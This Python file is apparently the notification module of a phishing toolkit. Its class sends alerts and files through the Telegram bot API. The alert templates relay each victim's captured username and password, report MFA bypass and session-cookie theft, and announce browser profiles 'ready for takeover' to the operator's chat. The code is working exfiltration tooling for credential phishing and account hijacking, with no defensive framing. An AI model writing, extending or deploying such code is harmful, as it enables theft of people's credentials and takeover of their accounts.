#!/usr/bin/env python3
"""
Telegram Bot Integration for Phishing Alerts
"""

import asyncio
import aiohttp
from typing import Optional


class TelegramNotifier:
    """Handles Telegram notifications for phishing events"""
    
    def __init__(self, bot_token: Optional[str], chat_id: Optional[str]):
        self.bot_token = bot_token
        self.chat_id = chat_id
        self.base_url = f"https://api.telegram.org/bot{bot_token}" if bot_token else None
    
    @property
    def is_configured(self) -> bool:
        """Check if Telegram is properly configured"""
        return bool(self.bot_token and self.chat_id)
    
    async def send_message(self, text: str, parse_mode: str = "HTML") -> bool:
        """Send a message to the configured chat"""
        if not self.is_configured:
            print(f"[Telegram] Not configured, would send: {text[:100]}...")
            return False
        
        url = f"{self.base_url}/sendMessage"
        payload = {
            "chat_id": self.chat_id,
            "text": text,
            "parse_mode": parse_mode,
            "disable_web_page_preview": True
        }
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(url, json=payload) as response:
                    if response.status == 200:
                        print(f"[Telegram] Message sent successfully")
                        return True
                    else:
                        error = await response.text()
                        print(f"[Telegram] Error: {response.status} - {error}")
                        return False
        except Exception as e:
            print(f"[Telegram] Exception: {e}")
            return False
    
    async def send_document(self, file_path: str, caption: str = "") -> bool:
        """Send a file to the configured chat"""
        if not self.is_configured:
            print(f"[Telegram] Not configured, would send file: {file_path}")
            return False
        
        url = f"{self.base_url}/sendDocument"
        
        try:
            async with aiohttp.ClientSession() as session:
                with open(file_path, 'rb') as f:
                    data = aiohttp.FormData()
                    data.add_field('chat_id', self.chat_id)
                    data.add_field('document', f, filename=file_path.split('/')[-1])
                    if caption:
                        data.add_field('caption', caption)
                        data.add_field('parse_mode', 'HTML')
                    
                    async with session.post(url, data=data) as response:
                        if response.status == 200:
                            print(f"[Telegram] Document sent successfully")
                            return True
                        else:
                            error = await response.text()
                            print(f"[Telegram] Error: {response.status} - {error}")
                            return False
        except Exception as e:
            print(f"[Telegram] Exception: {e}")
            return False
    
    async def send_alert(self, alert_type: str, session_id: str, details: dict) -> bool:
        """Send a formatted alert based on type"""
        
        templates = {
            "session_start": (
                "🟢 <b>New Session Started</b>\n\n"
                "📋 Session: <code>{session_id}</code>\n"
                "🌐 Target: {target}\n"
                "⏰ Time: {timestamp}"
            ),
            "credentials": (
                "🔑 <b>CREDENTIALS CAPTURED!</b>\n\n"
                "📋 Session: <code>{session_id}</code>\n"
                "👤 Username: <code>{username}</code>\n"
                "🔒 Password: <code>{password}</code>\n"
                "🌐 Target: {target}"
            ),
            "mfa_started": (
                "📱 <b>MFA Challenge Started</b>\n\n"
                "📋 Session: <code>{session_id}</code>\n"
                "🔐 Type: {mfa_type}\n"
                "⏳ Waiting for victim..."
            ),
            "mfa_completed": (
                "✅ <b>MFA BYPASSED!</b>\n\n"
                "📋 Session: <code>{session_id}</code>\n"
                "🎯 Session cookies captured!\n"
                "📦 Profile ready for export"
            ),
            "session_captured": (
                "🎣 <b>SESSION FULLY CAPTURED!</b>\n\n"
                "📋 Session: <code>{session_id}</code>\n"
                "🍪 Cookies: {cookie_count}\n"
                "📁 Profile: <code>{profile_path}</code>\n\n"
                "✅ Ready for takeover!"
            )
        }
        
        template = templates.get(alert_type, "📢 Alert: {alert_type}\nSession: {session_id}")
        
        # Format message with details
        message = template.format(
            session_id=session_id,
            alert_type=alert_type,
            **details
        )
        
        return await self.send_message(message)


# Test function
async def test_telegram():
    """Test Telegram connection"""
    import os
    
    notifier = TelegramNotifier(
        bot_token=os.environ.get("TELEGRAM_BOT_TOKEN"),
        chat_id=os.environ.get("TELEGRAM_CHAT_ID")
    )
    
    if notifier.is_configured:
        success = await notifier.send_message(
            "🧪 <b>Test Message</b>\n\nPhishing toolkit is connected!"
        )
        print(f"Test message sent: {success}")
    else:
        print("Telegram not configured. Set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID")


if __name__ == "__main__":
    asyncio.run(test_telegram())
